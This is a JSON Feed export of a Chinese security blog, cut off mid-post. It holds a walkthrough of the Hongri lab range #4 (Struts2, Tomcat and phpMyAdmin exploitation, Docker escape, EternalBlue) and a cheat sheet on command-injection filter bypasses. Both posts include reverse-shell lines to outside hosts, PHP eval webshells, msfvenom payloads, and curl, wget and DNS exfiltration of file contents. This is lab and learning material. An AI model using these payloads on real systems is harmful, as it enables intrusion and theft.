{
    "version": "https://jsonfeed.org/version/1",
    "title": "M1N's Blog",
    "description": "M1N的博客",
    "home_page_url": "http://blog.m1n.me",
    "items": [
        {
            "id": "http://blog.m1n.me/2021/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0/",
            "url": "http://blog.m1n.me/2021/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0/",
            "title": "红日靶场(四)笔记",
            "date_published": "2021-09-20T15:49:36.000Z",
            "content_html": "<h1 id=\"红日靶场-四-笔记\"><a href=\"#红日靶场-四-笔记\" class=\"headerlink\" title=\"红日靶场(四)笔记\"></a>红日靶场(四)笔记</h1><h2 id=\"外网打点\"><a href=\"#外网打点\" class=\"headerlink\" title=\"外网打点\"></a>外网打点</h2><h3 id=\"2001端口Struct2\"><a href=\"#2001端口Struct2\" class=\"headerlink\" title=\"2001端口Struct2\"></a>2001端口Struct2</h3><p>Burp抓包看到Struct2字样，直接工具测试一把梭</p>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png\"></p>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png\"></p>\n<h3 id=\"2002端口Tomcat\"><a href=\"#2002端口Tomcat\" class=\"headerlink\" title=\"2002端口Tomcat\"></a>2002端口Tomcat</h3><p>可以参考<a href=\"https://www.freebuf.com/articles/web/271892.html\">https://www.freebuf.com/articles/web/271892.html</a></p>\n<p>使用PUT上传冰蝎马，注意直接上传<code>/shell.jsp</code>不行哦</p>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png\"></p>\n<h3 id=\"2003端口phpMyAdmin-4-8-1\"><a href=\"#2003端口phpMyAdmin-4-8-1\" class=\"headerlink\" title=\"2003端口phpMyAdmin 4.8.1\"></a>2003端口phpMyAdmin 4.8.1</h3><p>可以参考<a href=\"https://www.dazhuanlan.com/oliiiflorrr/topics/1144804\">https://www.dazhuanlan.com/oliiiflorrr/topics/1144804</a></p>\n<ol>\n<li>验证漏洞是否存在</li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png\"></p>\n<ol start=\"2\">\n<li>使用SELECT语句后包含session文件来get shell，写shell<code>SELECT &quot;&lt;?php phpinfo();file_put_contents(&#39;m1n.php&#39;, &#39;&lt;?=@eval($_POST[1]);&#39;);?&gt;&quot;  </code>，访问发现<code>http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867</code>出现phpinfo，用蚁剑连接m1n.php即可。</li>\n</ol>\n<h2 id=\"Docker逃逸（2002端口的Tomcat）\"><a href=\"#Docker逃逸（2002端口的Tomcat）\" class=\"headerlink\" title=\"Docker逃逸（2002端口的Tomcat）\"></a>Docker逃逸（2002端口的Tomcat）</h2><h3 id=\"如何判断是否在Docker里\"><a href=\"#如何判断是否在Docker里\" class=\"headerlink\" title=\"如何判断是否在Docker里\"></a>如何判断是否在Docker里</h3><ul>\n<li>检查 <code>/.dockerenv</code> 文件是否存在</li>\n<li>检查 <code>/proc/1/cgroup</code> 内是否包含 Docker 等字符串</li>\n</ul>\n<h3 id=\"尝试DirtyCow漏洞逃逸\"><a href=\"#尝试DirtyCow漏洞逃逸\" class=\"headerlink\" title=\"尝试DirtyCow漏洞逃逸\"></a>尝试DirtyCow漏洞逃逸</h3><ol>\n<li>下载POC：<a href=\"https://github.com/scumjr/dirtycow-vdso\">https://github.com/scumjr/dirtycow-vdso</a></li>\n<li>编译，上传，监听，运行，没反应，下一个。</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">git clone https:<span class=\"hljs-regexp\">//gi</span>thub.com<span class=\"hljs-regexp\">/scumjr/</span>dirtycow-vdso.git<br>cd dirtycow-vdso<br>make<br>./<span class=\"hljs-number\">0</span>xdeadbeef ip:port<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"尝试runC容器逃逸漏洞（CVE-2019-5736）\"><a href=\"#尝试runC容器逃逸漏洞（CVE-2019-5736）\" class=\"headerlink\" title=\"尝试runC容器逃逸漏洞（CVE-2019-5736）\"></a>尝试runC容器逃逸漏洞（CVE-2019-5736）</h3><ol>\n<li>下载POC：<a href=\"https://github.com/Frichetten/CVE-2019-5736-PoC\">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>\n<li>改POC，把payload那行改成自己VPS的IP</li>\n<li>编译（建议Linux环境下）<code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></li>\n<li>上传文件，监听端口，执行，没反应，下一个。</li>\n</ol>\n<h3 id=\"尝试特权模式逃逸\"><a href=\"#尝试特权模式逃逸\" class=\"headerlink\" title=\"尝试特权模式逃逸\"></a>尝试特权模式逃逸</h3><ol>\n<li><code>fdisk -l</code>查看磁盘</li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png\"></p>\n<ol start=\"2\">\n<li><p>在根目录下创建文件夹，把/dev/sda1挂在到该文件夹</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">mkdir</span> /m<span class=\"hljs-number\">1</span>n<br><span class=\"hljs-attribute\">mount</span> /dev/sda<span class=\"hljs-number\">1</span> /m<span class=\"hljs-number\">1</span>n<br></code></pre></td></tr></table></figure></li>\n<li><p>可以看到宿主机的文件都到了/m1n目录下</p>\n</li>\n</ol>\n<p><img src=\"C:\\Users\\M1N\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210816152534150.png\" alt=\"image-20210816152534150\"></p>\n<h4 id=\"尝试写定时任务来反弹shell\"><a href=\"#尝试写定时任务来反弹shell\" class=\"headerlink\" title=\"尝试写定时任务来反弹shell\"></a>尝试写定时任务来反弹shell</h4><p>参考：<a href=\"https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/\">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>\n<ol>\n<li>写文件到<code>/var/spool/cron/crontabs/root</code>，注意写到<code>/var/spool/cron/root</code>不行嗷</li>\n<li>同时注意root文件的权限必须为600</li>\n<li>注意定时任务文件内容中，路径要用绝对路径，建议把命令写成<code>.sh</code>文件，然后<code>chmod +x</code>，然后调用，不容易出错</li>\n<li>也可以<code>*/1 * * * *  bash -c &quot;bash -i  &gt;&amp;/dev/tcp/123.207.x.x/1234 0&gt;&amp;1&quot;</code></li>\n<li>在本地的Ubuntu20虚拟机中成功反弹shell，但是靶场环境下没法成功，写入了定时任务必须restart才可以执行，否则不执行，无奈。</li>\n</ol>\n<p><strong>定时任务相关笔记：</strong></p>\n<ol>\n<li><p>定时任务有时无法看到报错信息，可以这样获取报错信息</p>\n<p><code>\\* * * * * &#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1&#39;&gt;/tmp/error.txt 2&gt;&amp;1</code></p>\n</li>\n<li><p>定时任务查看日志：<a href=\"https://www.cnblogs.com/zhangshengxiang/p/11842326.html\">https://www.cnblogs.com/zhangshengxiang/p/11842326.html</a></p>\n<p>（1）查看系统日志直接：<code>tail -f /var/log/syslog</code></p>\n<p>（2）查看crontab日志：</p>\n<p>​    方法1</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. 修改rsyslog文件，将<span class=\"hljs-regexp\">/etc/</span>rsyslog.d/<span class=\"hljs-number\">50</span>-default.conf 文件中的<span class=\"hljs-comment\">#cron.*前的#删掉；</span><br><span class=\"hljs-number\">2</span>. 重启rsyslog服务service rsyslog restart<br><span class=\"hljs-number\">3</span>. 重启cron服务service cron restart<br></code></pre></td></tr></table></figure>\n\n<p>​    方法2</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. 编辑 <span class=\"hljs-regexp\">/etc/</span>syslog.conf，并且打开以cron.*开始的那行注释。<br><span class=\"hljs-number\">2</span>. 运行 <span class=\"hljs-regexp\">/etc/i</span>nit.d/sysklogd restart<br><span class=\"hljs-number\">3</span>. 运行 <span class=\"hljs-regexp\">/etc/i</span>nit.d/cron restart<br></code></pre></td></tr></table></figure>\n\n<p>​    查看cron日志</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. linux<br>看 <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/cron这个文件就可以，可以用tail -f /</span>var<span class=\"hljs-regexp\">/log/</span>cron观察（或者<span class=\"hljs-regexp\">/var/</span>log/cron.log）<br><br><span class=\"hljs-number\">2</span>. unix<br>在 <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/cron/</span>tmp文件中，有croutXXX001864的tmp文件，tail 这些文件就可以看到正在执行的任务了。<br><br><span class=\"hljs-number\">3</span>. mail任务<br>在 <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/mail/</span>root 文件中，有crontab执行日志的记录，用tail -f <span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/mail/</span>root 即可查看最近的crontab执行情况<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h4 id=\"尝试写-ssh公钥来连接\"><a href=\"#尝试写-ssh公钥来连接\" class=\"headerlink\" title=\"尝试写.ssh公钥来连接\"></a>尝试写.ssh公钥来连接</h4><ol>\n<li><p>本地生成公私钥</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">ssh</span>-keygen -f m<span class=\"hljs-number\">1</span>n<br><span class=\"hljs-attribute\">chmod</span> <span class=\"hljs-number\">600</span> m<span class=\"hljs-number\">1</span>n<br></code></pre></td></tr></table></figure></li>\n<li><p>把m1n.pub文件上传到服务器的<code>/root/.ssh/</code>目录下（注意，是/m1n下的/root/.ssh），没有这个目录就创建这个目录</p>\n</li>\n<li><p>把m1n.pub的文件内容写到authorized_keys文件中<code>cat m1n.pub &gt; authorized_keys</code></p>\n</li>\n<li><p>然后<code>ssh -i m1n root@ip</code>连接，即可</p>\n</li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png\"></p>\n<ol start=\"5\">\n<li>踩坑笔记：不要写公钥到<code>/home/ubuntu/.ssh/</code>目录下，连不上。</li>\n</ol>\n<h2 id=\"内网渗透\"><a href=\"#内网渗透\" class=\"headerlink\" title=\"内网渗透\"></a>内网渗透</h2><h3 id=\"传🐎\"><a href=\"#传🐎\" class=\"headerlink\" title=\"传🐎\"></a>传🐎</h3><h4 id=\"MSF🐎\"><a href=\"#MSF🐎\" class=\"headerlink\" title=\"MSF🐎\"></a>MSF🐎</h4><ol>\n<li><p>生成msf🐎</p>\n<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.192.168.145 LPORT=4444 -f elf &gt; mshell.elf</code></p>\n</li>\n<li><p>把🐎儿传到目标机子上面</p>\n</li>\n<li><p>攻击机执行以下</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\">use exploit/multi/handler<br><span class=\"hljs-builtin-name\">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class=\"hljs-builtin-name\">set</span> lhost 10.192.168.145<br><span class=\"hljs-builtin-name\">set</span> lport 4444<br>run<br></code></pre></td></tr></table></figure></li>\n<li><p>目标机器添加权限后执行mshell.elf</p>\n</li>\n<li><p>kali接收到shell</p>\n</li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png\"></p>\n<ol start=\"5\">\n<li><p>msf拿到shell后，需要导入路由，使用msf6的自动路由导入</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stata\">background<br><br><span class=\"hljs-keyword\">use</span> <span class=\"hljs-keyword\">post</span>/multi/manage/autoroute<br><br><span class=\"hljs-keyword\">set</span> session x<br><br><span class=\"hljs-keyword\">run</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png\"></p>\n</li>\n</ol>\n<h3 id=\"代理转发\"><a href=\"#代理转发\" class=\"headerlink\" title=\"代理转发\"></a>代理转发</h3><h4 id=\"使用ew代理转发\"><a href=\"#使用ew代理转发\" class=\"headerlink\" title=\"使用ew代理转发\"></a>使用ew代理转发</h4><ol>\n<li>上传ew_for_linux64</li>\n<li>执行<code>./ew -s ssocksd -l 8888</code></li>\n<li>更改kali的/etc/proxychains4.conf文件，添加socks5 ip prot</li>\n<li>在需要代理时，执行命令如<code>proxychains4 curl http://127.0.0.1:2003/</code>即可</li>\n</ol>\n<h3 id=\"Ubuntu信息收集\"><a href=\"#Ubuntu信息收集\" class=\"headerlink\" title=\"Ubuntu信息收集\"></a>Ubuntu信息收集</h3><ol>\n<li><p>从路由表可以看到有几个网段，有个183网段应该就是内网网段了</p>\n</li>\n<li><p>msf进行一波存活扫描</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">use</span> auxiliary/scanner/discovery/udp_probeset rhosts <span class=\"hljs-number\">192.168.183.0</span>-<span class=\"hljs-number\">255</span>set threads <span class=\"hljs-number\">5</span>run<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png\"></p>\n<p>可以看到有128、130两台机子。</p>\n</li>\n<li><p>扫一下ms17-010</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">use</span> auxiliary/scanner/smb/smb_ms<span class=\"hljs-number\">17</span>_<span class=\"hljs-number\">010</span>set rhosts <span class=\"hljs-number\">192.168.183.128</span>-<span class=\"hljs-number\">130</span>run<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png\"></p>\n<p>可以看到128的win7和130的winserver2008都可能存在永恒之蓝。</p>\n</li>\n<li><p>尝试打永恒之蓝，测试发现128的win7能打通，130的winserver2008打不通。</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">setg Proxies socks5:<span class=\"hljs-number\">10.0</span>.<span class=\"hljs-number\">5.100</span>:<span class=\"hljs-number\">8888</span>\t\t\t\t\t<span class=\"hljs-regexp\">//</span>MSF走ew的代理set ReverseAllowProxy true\t\t\t\t\t\t\t<span class=\"hljs-regexp\">//</span>开启反向代理use exploit<span class=\"hljs-regexp\">/windows/</span>smb<span class=\"hljs-regexp\">/ms17_010_eternalblueset payload windows/</span>x64<span class=\"hljs-regexp\">/meterpreter/</span>bind_tcpset rhost <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.128</span>set lport <span class=\"hljs-number\">4444</span>set AutoRunScript post<span class=\"hljs-regexp\">/windows/m</span>anage<span class=\"hljs-regexp\">/migrate       /</span><span class=\"hljs-regexp\">/自动迁移进程run</span><br></code></pre></td></tr></table></figure>\n\n<p>成功拿下shell</p>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png\"></p>\n</li>\n</ol>\n<h3 id=\"Win7权限维持\"><a href=\"#Win7权限维持\" class=\"headerlink\" title=\"Win7权限维持\"></a>Win7权限维持</h3><ol>\n<li>虽然拿到了shell，但是在使用过程中发现这个shell经常掉线，只能想办法弄个稳定点的shell</li>\n<li></li>\n</ol>\n<h3 id=\"Win7信息收集\"><a href=\"#Win7信息收集\" class=\"headerlink\" title=\"Win7信息收集\"></a>Win7信息收集</h3><ol>\n<li><code>route print</code></li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737582.png\"></p>\n<ol start=\"2\">\n<li><code>net user /domain</code></li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png\"></p>\n<ol start=\"3\">\n<li><code>net user</code></li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png\"></p>\n<ol start=\"4\">\n<li><code>net view</code></li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png\"></p>\n<ol start=\"5\">\n<li><code>ping WIN-ENS2VR5TR3N</code></li>\n</ol>\n<p><img src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071744532.png\"></p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2020/07/09/%E5%AD%98%E5%9C%A8%E9%99%90%E5%88%B6%E7%9A%84shell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "url": "http://blog.m1n.me/2020/07/09/%E5%AD%98%E5%9C%A8%E9%99%90%E5%88%B6%E7%9A%84shell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "title": "存在限制的shell命令执行",
            "date_published": "2020-07-09T09:01:12.000Z",
            "content_html": "<h1 id=\"截断符-amp-amp\"><a href=\"#截断符-amp-amp\" class=\"headerlink\" title=\"截断符;,|,||,&amp;&amp;\"></a>截断符<code>;</code>,<code>|</code>,<code>||</code>,<code>&amp;&amp;</code></h1><ol>\n<li><code>|</code>表示管道，上一条命令的输出，作为下一条命令参数(输入)</li>\n<li><code>||</code> 表示上一条命令执行失败后，才执行下一条命令</li>\n<li><code>&amp;&amp;</code>表示前一条命令执行成功时，才执行后一条命令</li>\n<li><code>&amp;</code>表示任务在后台执行,如<code>java -jar test.jar &gt; log.txt &amp;</code>，同时，放在两个命令之间时两个都会执行，第一个命令后台执行</li>\n<li><code>%0a</code>换行符</li>\n<li><code>%0d</code>回车符</li>\n<li><code>;</code></li>\n</ol>\n<h1 id=\"shell存在部分过滤\"><a href=\"#shell存在部分过滤\" class=\"headerlink\" title=\"shell存在部分过滤\"></a>shell存在部分过滤</h1><ol>\n<li><p>过滤了空格</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-variable\">$IFS</span><br><span class=\"hljs-variable\">$&#123;IFS&#125;</span><br><span class=\"hljs-variable\">$IFS</span><span class=\"hljs-variable\">$1</span> <span class=\"hljs-regexp\">//</span><span class=\"hljs-variable\">$1</span>改成$加其他数字貌似都行<br>&lt; <br>&lt;&gt; <br>&#123;cat,flag.php&#125;  <span class=\"hljs-regexp\">//</span>用逗号实现了空格功能<br>%<span class=\"hljs-number\">20</span><br>%<span class=\"hljs-number\">09</span><br>kg=$<span class=\"hljs-string\">&#x27;\\x20/flag&#x27;</span>&amp;&amp;cat<span class=\"hljs-variable\">$kg</span> <span class=\"hljs-regexp\">//</span>\\x20变成了空格<br>\\t和\\r和\\n代替空格<br></code></pre></td></tr></table></figure></li>\n<li><p>过滤了部分关键词</p>\n<figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs taggerscript\">拼接实现绕过：a=l;b=s;<span class=\"hljs-keyword\">$a$b</span><br><span class=\"hljs-keyword\">引号、反斜杠绕过：ca&#x27;&#x27;t    ca&quot;&quot;t  ca\\t</span><br><span class=\"hljs-keyword\">特殊变量绕过：ca#@t  ca#*t</span><br><span class=\"hljs-keyword\">编码绕过：echo Y2F0IC9mbGFn|base64 -d|bash</span><br><span class=\"hljs-keyword\">\t\techo &quot;636174202f666c6167&quot; | xxd -r -p|bash（hex编码）</span><br><span class=\"hljs-keyword\">\t\t$</span>(printf &quot;<span class=\"hljs-symbol\">\\x</span>63<span class=\"hljs-symbol\">\\x</span>61<span class=\"hljs-symbol\">\\x</span>74<span class=\"hljs-symbol\">\\x</span>20<span class=\"hljs-symbol\">\\x</span>2f<span class=\"hljs-symbol\">\\x</span>66<span class=\"hljs-symbol\">\\x</span>6c<span class=\"hljs-symbol\">\\x</span>61<span class=\"hljs-symbol\">\\x</span>67&quot;)<br>\t\t&#123;printf,&quot;<span class=\"hljs-symbol\">\\x</span>63<span class=\"hljs-symbol\">\\x</span>61<span class=\"hljs-symbol\">\\x</span>74<span class=\"hljs-symbol\">\\x</span>20<span class=\"hljs-symbol\">\\x</span>2f<span class=\"hljs-symbol\">\\x</span>66<span class=\"hljs-symbol\">\\x</span>6c<span class=\"hljs-symbol\">\\x</span>61<span class=\"hljs-symbol\">\\x</span>67&quot;&#125;|bash<br>\t\t当bash也被禁时，可以试试sh<br>通配符绕过：fl*   fla?   fla[0-z]  fla[123hg]  fla&#123;1,2,3,g&#125; <br>\t\t一些常用的通配符：<br>\t\t\t* 匹配任意个数的字符<br>\t\t\t? 匹配一个字符<br>\t\t\t[list] 匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合<br>\t\t\t[^list] 匹配指定范围外的任意单个字符或字符集合<br>\t\t\t[!list] 和[^list]一样<br>\t\t\t&#123;1,2,&#125; 逐一匹配<br></code></pre></td></tr></table></figure></li>\n<li><p>过滤<code>/</code></p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs powershell\"><span class=\"hljs-built_in\">cat</span> `expr substr <span class=\"hljs-variable\">$</span>(<span class=\"hljs-built_in\">pwd</span>) <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">1</span>`flag<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"无回显\"><a href=\"#无回显\" class=\"headerlink\" title=\"无回显\"></a>无回显</h1><p>文章：’<a href=\"https://250.ac.cn/2018/12/18/%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%88%A9%E7%94%A8/\">https://250.ac.cn/2018/12/18/%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%88%A9%E7%94%A8/</a>‘</p>\n<h3 id=\"服务器可以访问外网\"><a href=\"#服务器可以访问外网\" class=\"headerlink\" title=\"服务器可以访问外网\"></a>服务器可以访问外网</h3><ol>\n<li><p>curl ：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">curl http:<span class=\"hljs-regexp\">//</span>**.**.**.**<span class=\"hljs-regexp\">/index.php?jingzhe=`cat /</span>flag`<br>curl -d `cat <span class=\"hljs-regexp\">/flag|base64` http:/</span><span class=\"hljs-regexp\">/example.com</span><br></code></pre></td></tr></table></figure></li>\n<li><p>wget:</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">wget http:<span class=\"hljs-regexp\">//</span>**.**.**.**<span class=\"hljs-regexp\">/index.php?jingzhe=`cat /</span>flag`<br></code></pre></td></tr></table></figure></li>\n<li><p>DNSlog:</p>\n<figure class=\"highlight autohotkey\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs autohotkey\">ping `cat /flag`.aaaaaa.ceye.io<br></code></pre></td></tr></table></figure></li>\n<li><p>写shell：</p>\n<figure class=\"highlight php-template\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php-template\"><span class=\"xml\">echo &#x27;</span><span class=\"php\"><span class=\"hljs-meta\">&lt;?php</span> @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&quot;flag&quot;</span>]); <span class=\"hljs-meta\">?&gt;</span></span><span class=\"xml\">&#x27; &gt; aaa.php</span><br></code></pre></td></tr></table></figure></li>\n<li><p>反弹shell</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs elixir\"><span class=\"hljs-variable\">$ </span>bash -c <span class=\"hljs-string\">&quot;sh &gt;&amp; /dev/tcp/0.0.0.0/80 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"服务器无法访问外网\"><a href=\"#服务器无法访问外网\" class=\"headerlink\" title=\"服务器无法访问外网\"></a>服务器无法访问外网</h3><p>爆破，EXP：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-comment\"># -*-coding:utf-8 -*-import requestsimport reflag_format = re.compile(&#x27;flag\\\\&#123;[0-9a-z]&#123;8&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;12&#125;\\\\&#125;&#x27;)all_letter = &#x27;-&#125;0123456789abcdefghijklmnopqrstuvwxyz&#x27;def get_flag(command):    try:        r = requests.get(&#x27;http://web.train.lilac.com:10008/&#x27;, params=&#123;&#x27;command&#x27;: command&#125;, timeout=1.5)    except:        return True    return Falseif __name__ == &#x27;__main__&#x27;:    flag = &#x27;flag&#123;&#x27;    while flag_format.match(flag) == None:        staus = 0        for i in all_letter:            payload = &#x27;| cat /flag | grep %s &amp;&amp; sleep 1.8&#x27; % (flag + i)            print(payload)            if get_flag(payload):                staus = 1                flag += i                print(flag)                break        if staus == 0:            flag = flag[0:-1]</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参数注入\"><a href=\"#参数注入\" class=\"headerlink\" title=\"参数注入\"></a>参数注入</h1><p><a href=\"https://www.anquanke.com/post/id/107336\">https://www.anquanke.com/post/id/107336</a></p>\n<ol>\n<li><p>tar</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stata\">tar --<span class=\"hljs-keyword\">use</span>-<span class=\"hljs-keyword\">compress</span>-<span class=\"hljs-keyword\">program</span>=&#x27;<span class=\"hljs-keyword\">cat</span> /etc/passwd&#x27; -<span class=\"hljs-keyword\">cf</span> 2.tar *<span class=\"hljs-keyword\">cat</span> 2.tar<br></code></pre></td></tr></table></figure></li>\n<li><p>find</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sqf\"><span class=\"hljs-built_in\">find</span> . -<span 